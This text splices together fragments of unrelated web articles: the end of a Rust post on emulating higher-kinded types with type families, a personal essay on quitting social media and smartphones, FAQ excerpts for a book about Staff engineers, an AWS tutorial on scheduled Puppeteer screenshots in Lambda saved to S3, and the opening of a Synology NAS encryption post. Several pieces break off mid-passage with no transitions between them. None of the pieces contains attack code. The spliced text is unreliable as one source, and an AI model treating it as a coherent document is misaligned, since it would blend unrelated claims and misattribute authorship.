<p>Let’s also introduce a type alias for ease of use.</p>

<div><div><pre><code><span>// Option&lt;A&gt; == This&lt;OptionFamily, A&gt;</span>
<span>pub</span> <span>type</span> <span>This</span><span>&lt;</span><span>T</span><span>,</span> <span>A</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;&gt;</span><span>::</span><span>This</span><span>;</span>
</code></pre></div></div>

<p>Now we can replace all usage of <code>Option</code>, <code>Result&lt;_, E&gt;</code> with <code>OptionFamily</code> or <code>ResultFamily&lt;E&gt;</code>! From this we can build up abstractions that “require” HKT. Let’s start with the simplest abstraction <code>Functor</code>. This is just any <code>Type -&gt; Type</code> that has a notion of mapping a value. Generally <code>Functor</code> represents a collection, but it can do much more than that (But I won’t dive into <code>Functor</code> in particular in this post).</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is quite a lot, so let’s soak it in.</p>

<div><div><pre><code><span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span>
</code></pre></div></div>

<p>First, we require that our families can be used with either type. This allows you to restrict the families in some ways, for example for <code>HashSet</code>, only allow <code>T: Hash + Eq</code>. <code>A</code> will be the input type, and <code>B</code> will be the output type.</p>

<div><div><pre><code><span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>Next we have this monstrous function! This will be easier to explain if we have a concrete family.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>So this is just the same as the ordinary map in <code>Option</code>, except it requires <code>Fn</code>, instead of <code>FnOnce</code>. We could generalize over <code>Fn</code> and <code>FnOnce</code> if Rust had associated traits, but alas we don’t, so we’ll have to make do with <code>Fn</code> (I’ll leave it to you to figure out a nice way to abstract over <code>Fn</code>, <code>FnMut</code> and <code>FnOnce</code>). All we’ve done is generalize it to <em>any</em> family, not just <code>Option</code>.</p>

<p>The <code>Copy</code> bound is nice for things like <code>Vec</code> where you need to apply the function multiple times. You can convert any <code>Fn</code> to a <code>Fn + Copy</code> because <code>&amp;_</code> implement <code>Fn</code> and are <code>Copy</code>.</p>

<p>So all together again:</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p><code>Functor</code> just specifies a mapping operation. We can implement this rather easily.</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// I'm not cheating!</span>
        <span>this</span><span>.map</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>Ok, but that’s boring, I hear you say. What about <code>Monad</code>? Typically it’s defined by it’s <code>bind</code> operation (We’ll skip <code>Applicative</code> here, try it out yourself!). I’m not going to explain how <code>Monad</code> works, or why you would want it, just how to implement it.</p>

<div><div><pre><code><span>trait</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Looks the same as <code>Functor</code> to me! … Wait, the bound on <code>F</code> looks funky. Let’s dig in to the <code>OptionFamily</code> implementation again, maybe that will clear things up.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>This looks very familiar, … where have I seen this before? <code>Option::and_then</code> is that you?</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// It fits 😉</span>
        <span>this</span><span>.and_then</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>In this way you can implement most, if not all <code>HKT</code> abstractions in stable Rust. However the ergonomics of these abstractions are downright abysmal. Bounds, bounds, bounds <em>everywhere</em>. We saw this a little in <code>Functor&lt;A, B&gt;</code>, we needed <code>OneTypeParam&lt;A&gt; + OneTypeParam&lt;B&gt;</code> (why does family need to be repeated!). Hopefully we can solve this on nightly, find out next time …</p>

<p>If you can’t wait and must know more, check out <a href="https://github.com/rustyyato/type-families"><code>type-families</code></a>, an experimental crate that implements the ideas outlined in this blog post.</p>

<p>At the time of writing this article, I’ve been living without social media for 3 years and without a smartphone for 2 years. Everything started as an experiment motivated by my privacy concerns. I ended up living like that for an entire different reason: peace of mind. You can find a lot of people on internet that have tried this experiment, from a couple of days to an <a href="https://www.youtube.com/watch?v=B0RVWU_nROk">entire month</a>. However I discovered that the brain dependencies created by social media and smartphones take a lot longer to go away (30 days for me). You can’t really see the effects it has on your life unless you try this kind of experiment for a long time, because you will be stuck in the withdrawal phase that makes you crave dopamine.</p>
<p>Contrary to popular belief, I do not live in a cave where I spend my time coding without any social life, sorry guys ;) I did this experiment while having a busy professional and personal life: I traveled around the world, moved to a new city without knowing anyone, ran <a href="https://www.duple.io/">my own software startup</a>, met new people and made new friends, etc… So it is possible to live your life the same way, or even better, without a smartphone or social media.</p>
<p>I will share with you my experience leaving social media and my smartphone, the tools I replaced them with, some tips and tricks, people’s reactions to my experiment, as well as some funny anecdotes.</p>
<h2 id="lets-start-with-why">Let’s Start With Why</h2>
<h3 id="privacy">Privacy</h3>
<p>The original motivation behind this experiment was privacy. I’m a professional hacker, the things I can do are scary and I’m far from being the only one with these skills. <strong>Smartphones are a dream come true for people like me, little spy devices that are 24/7 on you, remotely accessible from anywhere around the world</strong>. Throw social media into the equation, and you can get inside the head of anybody, and make them do whatever you want. Yes, you should be scared. And that’s even without mentioning all the other <a href="https://lithub.com/what-does-privacy-really-mean-under-surveillance-capitalism/">privacy</a> and <a href="https://the.ink/p/we-can-have-democracy-or-we-can-have">freedom</a> issues that come with <a href="https://techcrunch.com/2019/09/04/facebook-phone-numbers-exposed/">social media</a> and <a href="https://nrkbeta.no/2020/12/03/my-phone-was-spying-on-me-so-i-tracked-down-the-surveillants/">smartphones</a>.</p>
<h3 id="curiosity">Curiosity</h3>
<p>Another reason, which is less dark, was curiosity. I like to experiment and try new things in my life. I was curious about the idea of living without a smartphone and social media especially in a world more connected than ever. And if I didn’t like the experiment, I could always go back to <a href="https://www.meta-nomad.net/avoiding-the-global-lobotomy/">zombieland</a>.</p>
<h3 id="planned-obsolescence">Planned Obsolescence</h3>
<p>The cherry on top was to stop paying each year for a new smartphone, that does nothing more than the previous one, just because the providers decided to <a href="https://en.wikipedia.org/wiki/Planned_obsolescence">sabotage old models</a> so they <a href="https://en.wikipedia.org/wiki/Batterygate">stop working</a>.</p>
<h3 id="peace-of-mind">Peace of mind</h3>
<p>This is for me the most important reason (even though I discovered it afterwards). The positive effects on your mind, being free from social media and smartphones, are incredible. More on it later.</p>

<blockquote>
<p>“Technology has solved old economics problems by giving us new psychological problems.”<br>
Mark Manson, The Subtle Art of Not Giving a F*ck</p>
</blockquote>
<p>In 2018 I deleted my accounts from Twitter, Facebook, Instagram and WhatsApp. No coming back, no temptation to reactivate them later on. I kept LinkedIn on standby for professional use although it came close to being deleted as well. WhatsApp got replaced by <a href="https://signal.org/">Signal</a> because Facebook bought them, plus <a href="https://www.forbes.com/sites/parmyolson/2018/09/26/exclusive-whatsapp-cofounder-brian-acton-gives-the-inside-story-on-deletefacebook-and-why-he-left-850-million-behind/">they’re not really big fan s of privacy</a>.</p>
<p>During that year I kept my smartphone, as I wanted to do the experiment gradually. This decision allowed me to discover something quite counter intuitive about social media and smartphones (more on it later).</p>
<p>From that point on I was reachable by SMS, call, email and Signal. I wasn’t ready for what happened next. Fasten your seatbelts.</p>
<h3 id="people-thought-i-was-dead">People Thought I Was Dead</h3>
<p>The first reaction people had was to think something bad had happened to me, some of them even thought I was dead. Then something socially curious happened: everybody started speaking to each other on Facebook and WhatsApp to try to figure out what was wrong. Some of them even contacted my family multiple times. They all had my phone number, email address and other ways of contacting me. <strong>However, none of them did</strong>. It was like I had exited the matrix, and was living in another reality.</p>
<h3 id="trustworthiness">Trustworthiness</h3>
<p>I was told that I couldn’t be trusted since people can’t check online what I’m doing when I’m not around.</p>
<p>Yeah, you read that right.</p>
<p><strong>Society has been brainwashed to believe that privacy is something criminal. Sorry to disappoint, but privacy is a basic fundament of freedom and democracy. That’s why the voting system is anonymous</strong> [1]. When people tell you “<a href="https://write.privacytools.io/freddy/why-privacy-matters-even-if-you-have-nothing-to-hide">If you have nothing to hide, you have nothing to fear</a>”, what they really mean is “democracy is overrated, get over it”.</p>
<p><em>[1] Privacy: you know who I am but not what I do. Anonymity: You know what I do but not who I am. The voting system uses both, privacy when you go vote, anonymity when they count the results.</em></p>
<h3 id="whatsapp">WhatsApp</h3>
<p>This was for me the biggest problem. <a href="https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html">Getting people out of WhatsApp</a> if they wanted to talk to me created a lot of friction. Some of them even stopped texting me because they had to open another app on their phone in order to write to me.</p>
<p>Yeah, you also read that right.</p>
<p>I don’t miss WhatsApp, nor do I miss its endless group talks without anything useful. If you leave one of these groups people look at you as if you did something wrong. In the end I still had access to all the event’s information I needed despite them being organized on WhatsApp. In regards to this, not having the app didn’t change my life much.</p>
<p>A trick I’ve developed, when giving my contact info to new people, is to enter my phone number on their smartphone myself, and install Signal for them. This removed a lot of friction. I would then explain my experiment to them and tell them I can only be contacted via this app. I’ve always had a positive reaction. Everybody’s been curious and asking a lot of questions.</p>
<h3 id="and-then-nothing-happened">And Then Nothing Happened</h3>
<p>During the first weeks without social media, I felt off. As if I was missing out on something big that was happening. Like everybody was having fun except me. Once the <a href="https://joshcsimmons.com/quit-social-media/">withdrawal phase</a> went away, I realized that my life hadn’t changed that much. I was still doing the same things, talking to the same people, going to the same parties, etc… It was just more quiet and peaceful.</p>
<p><strong>I was no longer bombarded with pictures of everybody trying to fake a life they’re not living for the sole purpose of impressing someone else: <a href="https://hbr.org/2017/04/a-new-more-rigorous-study-confirms-the-more-you-use-facebook-the-worse-you-feel">my life had just upgraded</a>.</strong></p>
<p>In the end, after everybody got over their initial shock and calmed down, it became normal for them to contact me using Signal, and life went on as usual.</p>
<h2 id="round-2-goodbye-smartphone">Round 2: Goodbye Smartphone</h2>
<p><img src="https://www.alvarez.io/img/color/l99-2.jpg" alt="Phone"></p>
<p>Unlike social media, smartphones are a lot harder to get rid off. They handle many more things than just simply communicating with people.  I work all day long with a computer, most of what the smartphone was doing could be handled by my laptop. For the rest, I narrowed down my bare essential to Music, Pictures, GPS navigation and of course GSM calls.</p>
<h3 id="the-hardware">The Hardware</h3>
<p>You could solve these problems quite easily using multiple devices, however I wanted to be smart about it and not walk around with a luggage just to carry around all this stuff. After doing some research I figured out the perfect combination and I was even able to reduce the amount of things I had in my pockets.</p>

          <h4>Will I like this book?</h4>
          <p>
	    I think you will, yes! However, since we probably haven't met, I'm not a particularly good judge of that.
	    Rather than trust me, read one of the sections available online
	    (my favorites are <a href="https://staffeng.com/guides/staff-archetypes">Staff engineer archetypes</a>
	    and <a href="https://staffeng.com/guides/work-on-what-matters">Work on what matters</a>),
	    and one or two of the interviews (I'd recommend <a href="https://staffeng.com/stories/ras-kasa-williams">Kasa's</a>
	      and <a href="https://staffeng.com/stories/michelle-bu">Michelle's</a>).
        </p></div>
      </div>
      <div>
        <div>
          <h4>Why write this book?</h4>
          <p>
	    There isn't much out there about being a senior technical leader outside of the management career track.
	    As I've worked with more folks in Staff and Principal engineer roles, this lack of guidance became
	    a point of friction for both them in self-directing their professional development and for me in trying to support
	    their growth. I wrote this book to become a more effective partner for the Staff engineers I work with,
	    and with the hope that it can help others who are chating their path to technical leadership
	    within an organization that's still figuring out how to support them.
	    </p>

      <div>
        <div>
          <h4>Are you the right author for this book?</h4>
          <p>
	    The role and career of Staff engineers is a topic that deserves to be written about far more than it is written about!
	    My hope is that this book is useful enough that more folks start to write about it,
	    and hopefully quickly surpass this book with better, more useful books of their own.
	  </p>
        </div>
      </div>
      <div>
        <div>
          <h4>Will this advice apply to my company?</h4>
          <p>
	    Advice without context should always be taken with a grain of salt!
	    This book is based on more than a dozen interviews with folks operating in Staff engineer, or equivalent, roles,
	    along with my personal experience leading engineering organizations at Calm, Stripe, and Uber.
	    My hope is that this broad perspective will make the book applicable to your experience,
	    although aspects of the advice are undeniably United States-centric and Silicon Valley-centric.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>Manipulating a web browser environment with an API provides a wide range of automation capabilities for developers. It allows you to generate PDF files, screenshot webpages, or run health checks on a website, all from code. It can also enable you to automate form submissions, build UI tests, or diagnose performance issues. <a href="https://chromium.googlesource.com/chromium/src/+/lkgr/headless/README.md">Headless Chromium</a> is a popular package for operating a browser programmatically. Whether you are load testing a website or periodically fetching content, this can be configured with minimal code.&nbsp;</p><p>You can run a headless browser on your local development machine or a remote server. However, many typical browser automation tasks are a good fit for <a href="https://aws.amazon.com/lambda/">AWS Lambda</a>. You can configure a Lambda function to start on a schedule, or in response to an event. You can also configure Lambda to scale up for load testing operations, making it a cost effective alternative to managing a fleet of instances.</p><p>In this blog post, I show how you can deploy a browser automation task to Lambda. This example uses the <a href="https://aws.amazon.com/serverless/sam/">AWS Serverless Application Model</a> (AWS SAM) to simplify the deployment of cloud resources. You can download the code for this blog post from the companion <a href="https://github.com/aws-samples/scheduled-website-screenshot-app">GitHub repository</a>. To deploy to your AWS account, follow the instructions in the <a href="https://github.com/aws-samples/scheduled-website-screenshot-app/blob/main/README.md">README file</a>.</p><h2 id="h-overview">Overview</h2><p>In the example application, a Lambda function is invoked every 15 minutes to take a screenshot of a webpage and save the image to an S3 bucket. The architecture looks like this:</p><figure><img loading="lazy" width="622" height="272" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image001.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image001.png 622w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/02/image001.png 300w" sizes="(max-width: 622px) 100vw, 622px"></figure><ol><li>An <a href="https://aws.amazon.com/eventbridge/">Amazon EventBridge</a> rule invokes the Lambda function using a <a href="https://docs.aws.amazon.com/eventbridge/latest/userguide/scheduled-events.html">schedule expression</a>.</li><li>The Lambda function uses Chromium to load the target webpage. Once the page is loaded and rendered, it takes a screenshot.</li><li>The screenshot is saved to an <a href="https://aws.amazon.com/s3/">Amazon S3</a> bucket.</li></ol><h2 id="h-how-the-code-works">How the code works</h2><p>This Node.js example uses an npm package called <a href="https://github.com/puppeteer/puppeteer">Puppeteer</a>, which exposes a high-level API to control the Chromium browser. A snippet of the <a href="https://github.com/aws-samples/scheduled-website-screenshot-app/blob/main/src/app.js">Lambda function</a> shows how this works:</p><div><div><div><div><pre>browser = await chromium.puppeteer.launch({
 &nbsp; &nbsp; args: chromium.args,
     defaultViewport: chromium.defaultViewport,
 &nbsp;   executablePath: await chromium.executablePath,
     headless: chromium.headless,
     ignoreHTTPSErrors: true,
});

let page = await browser.newPage()
await page.goto(pageURL)
const buffer = await page.screenshot()</pre></div></div></div></div><p>This uses JavaScript <a href="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Async_await">async/await</a> syntax to avoid callbacks and use sequential code flow. Once the browser object is defined, the code instructs Chromium (via Puppeteer) to fetch the webpage. After the page is loaded and the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">DOM</a> is rendered in the headless Chromium instance, it stores a screenshot of the page in a buffer variable. Finally, the image is written to the S3 bucket:</p><pre>const&nbsp;s3result&nbsp;=&nbsp;await&nbsp;s3
 &nbsp;&nbsp;.upload({
 &nbsp;&nbsp;   Bucket:&nbsp;process.env.S3_BUCKET,
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Key:&nbsp;`${Date.now()}.png`,
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Body:&nbsp;buffer,
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentType:&nbsp;'image/png',
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ACL:&nbsp;'public-read'
 &nbsp;&nbsp;&nbsp;})
 &nbsp;&nbsp;&nbsp;.promise()

console.log('S3 image URL:', s3result.Location) </pre><p>This uses the <a href="https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#upload-property">S3 upload method</a> in the <a href="https://aws.amazon.com/sdk-for-javascript/">AWS SDK for JavaScript</a>. It defines the bucket and key, sets the content type to PNG, and then configures the access control list (ACL) so the object is publicly viewable. Finally, it logs the public URL of the stored object.</p><h2 id="h-packaging-puppeteer-for-the-lambda-function">Packaging Puppeteer for the Lambda function</h2><p>Lambda allows you to package dependencies together with your code as a zip file. The deployment package can be up to <a href="https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html">250 MB (unzipped)</a> or 50 MB (zipped, for direct upload). For larger packages, it’s recommended that you use the new <a href="https://acloudguru.com/blog/engineering/packaging-aws-lambda-functions-as-container-images">container packaging format</a> for Lambda functions, which allows packages of up to 10 GB.&nbsp;</p><p>If you use a tool like AWS SAM or <a href="https://www.serverless.com/">Serverless framework</a>, the packages are created on your development machine, then zipped and uploaded to the Lambda service. At runtime, these files are unzipped in the Lambda execution environment when the function is run. These tools can simplify this packaging process and help streamline your deployments.</p><p>However, when you use a dependency that contains a binary, you must ensure that you package a version of the binary that is compatible with the operating system used by Lambda. The Puppeteer package contains an entire Chromium browser bundled into the deployment. Since the browser relies on binaries, npm installs the binary that matches the operating system of your local development machine. However, Lambda requires the binary that matches its underlying operating system, which is Amazon Linux 2.</p><p>To help with this, many popular packages have been converted into <a href="https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html">Lambda layers</a> by the community. You can define up to five layers per Lambda function and these are copied into your deployment package when you create or update a function. For Chromium, this makes it easier to run one binary version in development and use another binary version at runtime. Learn more about <a href="https://aws.amazon.com/blogs/compute/using-lambda-layers-to-simplify-your-development-process/">creating and using Lambda layers</a> to simplify your development process.</p><h2 id="h-using-a-community-maintained-lambda-layer">Using a community-maintained Lambda layer</h2><p>One developer has packaged a <a href="https://github.com/alixaxel/chrome-aws-lambda">Chromium binary for AWS Lambda</a> and published this to GitHub. You can install this with Puppeteer in your Lambda function by including the libraries in package.json. You can also bundle both with an existing public Lambda layer. <a href="https://github.com/shelfio/chrome-aws-lambda-layer">This GitHub repo</a> frequently publishes new versions of the <em>chrome-aws-lambda</em> package, which you can include directly in your Lambda function.</p><p>Layers are only available in the AWS Region where they are published. The maintainers of this public repo have published this layer to 16 Regions and provided layer ARNs in the <a href="https://github.com/shelfio/chrome-aws-lambda-layer/blob/master/readme.md">README file</a>. These ARNs are public and you can include in any Lambda function in those Regions in any AWS account.&nbsp;</p><p>These are many popular libraries that have been bundled into Lambda layers by the community. <a href="https://github.com/mthenw/awesome-layers">This GitHub repo</a> aggregates layers for commonly used utilities like GeoIP, MySQL, OpenSSL, Pandas, scikit-learn, and many others. To use these in your Lambda functions from a compatible runtime, you only need to include the layer ARN in a supported Region.</p><h2 id="h-understanding-the-aws-sam-template">Understanding the AWS SAM template</h2><p>The Lambda function in this example could have been defined directly in the AWS Management Console. However, by using AWS SAM, you can define the same infrastructure as code. This helps create repeatable deployments quickly and reduces human error from clicking around the console.</p><p>The <a href="https://github.com/aws-samples/scheduled-website-screenshot-app/blob/main/template.yaml">AWS SAM template</a> defines all the AW resources used by the application. First, it declares an S3 bucket:</p><pre>&nbsp; S3Bucket:
    Type: AWS::S3::Bucket &nbsp;</pre><p>Next, the template defines the Lambda function and where the code can be found. Since it runs an entire browser within the function, the memory is set to 4096 MB. The timeout is configured to 15 seconds to ensure that the function ends if the target webpage is unresponsive.&nbsp;</p><pre>SnapshotFunction:
 &nbsp; &nbsp; Type: AWS::Serverless::Function
 &nbsp; &nbsp; Description: Invoked by EventBridge scheduled rule
 &nbsp; &nbsp; Properties:
 &nbsp; &nbsp; &nbsp; CodeUri: src/
 &nbsp; &nbsp; &nbsp; Handler: app.handler
 &nbsp; &nbsp; &nbsp; Runtime: nodejs12.x
 &nbsp; &nbsp; &nbsp; Timeout: 15
 &nbsp; &nbsp; &nbsp; MemorySize: 4096 </pre><p>The template includes a reference to the publicly available Chromium layer and substitutes the Region code at deployment time. Providing that the example is deployed in one of those 16 Regions where the layer is available, the layer ARN is valid:</p><pre>Layers:
  - !Sub 'arn:aws:lambda:${AWS::Region}:764866452798:layer:chrome-aws-lambda:22'</pre><p>Environment variables are used to set the target website URL and define the bucket name to store the image. Finally, since the function only writes data to S3, it uses an AWS SAM <a href="https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/serverless-policy-templates.html">policy template</a> to provide write permissions to the single bucket. This follows the <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">principle of least privilege</a>:</p><pre>Environment:
 &nbsp;Variables:
 &nbsp; TARGET_URL: 'https://serverlessland.com'
 &nbsp; S3_BUCKET: !Ref S3Bucket
 Policies:
 &nbsp; - S3WritePolicy:
 &nbsp; &nbsp; &nbsp; BucketName: !Ref S3Bucket </pre><p>Lambda functions are invoked in response to events. In this case, the function runs at a timed interval, which is managed by EventBridge. Using a schedule expression, the template configures the function to run every 15 minutes:</p><pre>Events:
 &nbsp;CheckWebsiteScheduledEvent:
 &nbsp; &nbsp;Type: Schedule
 &nbsp; &nbsp;Properties:
 &nbsp; &nbsp; &nbsp;Schedule: rate(15 minutes) </pre><p>Anytime you make changes to the Lambda function or the resource in this template, run <em>sam deploy</em> again to deploy the new version to the AWS Cloud. The AWS SAM CLI detects the differences between versions and deploys the new code and resources automatically.&nbsp;</p><h2 id="h-testing-the-function">Testing the function</h2><p>After deployment the example application, navigate to the <a href="https://console.aws.amazon.com/lambda/home">Lambda console</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody" id="content"><p>I have taken a couple terabytes of photos over the years, and have a mild phobia of deleting data, so I keep my photos on a <a href="https://www.synology.com/en-global">Synology DiskStation NAS</a>. I’ve got all the files on the thing:</p><ul><li>backed up to the cloud</li><li>encrypted,</li></ul><p>because back in 2016, my <a href="https://www.instagram.com/p/BMpgY9zAGbD/">apartment was broken into and thieves took all the electronics</a>. I’ve been slightly paranoid ever since.</p><p>The Synology NAS generally works pretty well, but the interface for decrypting a drive after booting is <em>extremely</em> painful. It’s about 10 clicks, a username, two different passwords, and a UI that is kinda wonky (it’s a desktop in a web browser)? Here’s a screengrab:</p><figure><video alt="Unlocking an encrypted drive in the Synology DiskStation UI" src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/decrypt.mp4" width="588" muted="" autoplay="" loop="" playsinline=""></video><figcaption><p>22 seconds is my personal speed record.</p></figcaption></figure><p>There are alternative solutions to this – you can set it up so that it <a href="https://www.synology.com/en-au/knowledgebase/DSM/tutorial/File_Sharing/How_to_encrypt_and_decrypt_shared_folders_on_my_Synology_NAS#t4_1">reads the encryption key from a USB disk on startup, for example</a> – but, if I’m worried about the whole thing being stolen, it’s not a good idea to leave the encryption keys plugged into the thing, and it’s also not a nice UX to find and plug in a USB before turning the thing on.</p><p>This… seems kinda silly to me, and something that should be solvable with ✨ <em>technology</em> ✨. I’m only ever accessing this from one computer, for example, and every modern operating system has a good credential storage system (think <a href="https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac"><em>Keychain Access</em></a> on OSX or <a href="https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0"><em>Credential Manager</em></a> on Windows 10). So, maybe my computer could take care of supplying encryption keys to the DiskStation!</p><p>I went looking for options, and 